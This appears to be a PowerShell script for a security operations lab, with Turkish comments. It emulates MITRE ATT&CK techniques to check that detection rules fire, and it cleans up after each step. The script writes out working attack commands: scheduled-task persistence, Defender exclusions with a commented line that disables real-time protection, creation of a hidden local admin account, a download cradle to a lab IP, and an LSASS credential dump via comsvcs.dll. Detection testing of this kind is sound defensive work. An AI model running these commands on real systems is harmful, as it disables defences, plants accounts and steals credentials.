<#
=============================================================
  SOC Lab - Tespit Kuralı Doğrulama (100103 - 100107)
  Windows 11 endpoint'te YÖNETİCİ PowerShell ile çalıştır.
  SADECE kendi izole lab ortamında kullan.
  Her test MITRE tekniğini emüle eder, ardından temizler.

  Çalıştırma:
    Set-ExecutionPolicy -Scope Process Bypass -Force
    .\test_detection_rules.ps1
=============================================================
#>

function Step($id, $tech, $desc) {
    Write-Host "`n[$id] $tech - $desc" -ForegroundColor Red
    Read-Host "    Tetiklemek icin ENTER"
}

Write-Host "SOC LAB - Tespit Kurali Dogrulama" -ForegroundColor Cyan
Write-Host "UYARI: Yalnizca izinli lab ortami icin." -ForegroundColor Yellow

# ------------------------------------------------------------
# 100104 - T1053.005: Zamanlanmış görev (schtasks)  [EN GÜVENLİ]
# ------------------------------------------------------------
Step "100104" "T1053.005" "schtasks ile zamanlanmis gorev olusturma"
schtasks /create /tn "SOC_LAB_TEST" /tr "cmd.exe /c echo soc-lab-test" /sc onlogon /f
Start-Sleep 2
schtasks /delete /tn "SOC_LAB_TEST" /f   # temizlik

# ------------------------------------------------------------
# 100105 - T1562.001: Defender kurcalama (ExclusionPath - geri alınabilir)
# ------------------------------------------------------------
Step "100105" "T1562.001" "Defender exclusion ekleme"
powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Temp\soclabtest'"
Start-Sleep 2
try { Remove-MpPreference -ExclusionPath 'C:\Temp\soclabtest' -ErrorAction SilentlyContinue } catch {}
# (Alternatif - daha agresif, Tamper Protection engelleyebilir ama komut yine loglanir:)
# powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"

# ------------------------------------------------------------
# 100106 - T1136.001: Yeni yerel hesap + Administrators'a ekleme
# ------------------------------------------------------------
Step "100106" "T1136.001" "Yeni yerel admin hesabi"
net user soclabtest "P@ssw0rd123!" /add
net localgroup administrators soclabtest /add
Start-Sleep 2
net localgroup administrators soclabtest /delete   # temizlik
net user soclabtest /delete

# ------------------------------------------------------------
# 100107 - T1105: Uzaktan yük indirme cradle (zararsız URL)
# ------------------------------------------------------------
Step "100107" "T1105" "PowerShell/certutil ile uzaktan indirme"
powershell.exe -Command "(New-Object Net.WebClient).DownloadString('http://192.168.222.128/soc-lab-test.txt')" 2>$null
# Alternatif:
# certutil.exe -urlcache -split -f http://192.168.222.128/soc-lab-test.txt test.txt

# ------------------------------------------------------------
# 100103 - T1003.001: LSASS bellek erişimi (en hassas)
#   comsvcs.dll MiniDump GERÇEK bir credential-dump tekniğidir.
#   Defender bunu engelleyebilir; engellese bile Sysmon EID 10
#   (lsass erişimi) loglanır ve kural tetiklenebilir.
# ------------------------------------------------------------
Step "100103" "T1003.001" "LSASS MiniDump (Defender engelleyebilir)"
$lsass = Get-Process lsass
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $($lsass.Id) C:\Windows\Temp\lsass_test.dmp full 2>$null
Start-Sleep 2
Remove-Item C:\Windows\Temp\lsass_test.dmp -Force -ErrorAction SilentlyContinue   # temizlik

Write-Host "`nTum testler tamam. SOC sunucusunda dogrula:" -ForegroundColor Green
Write-Host "  sudo grep -E '10010[3-7]' /var/ossec/integrations/soar/soar.log"
